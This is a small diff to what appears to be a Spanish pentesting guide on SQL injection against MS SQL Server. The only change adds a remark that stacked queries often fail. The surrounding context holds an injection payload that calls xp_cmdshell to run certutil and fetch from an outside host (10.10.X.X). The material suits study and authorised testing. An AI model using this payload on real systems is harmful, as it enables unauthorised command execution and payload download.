@@ -786,4 +786,4 @@ Una vez hecho esto podemos ejecutar comandos a nivel de sistema:
 ```bash
 inyeccion';EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.X.X';--
 ```
-Para una mayor información visitar el siguiente enlace: https://www.tarlogic.com/es/blog/red-team-tales-0x01/
+Para una mayor información visitar el siguiente enlace: https://www.tarlogic.com/es/blog/red-team-tales-0x01/ , también es comun que los comandos no se ejecuten de forma de "stacked querys"
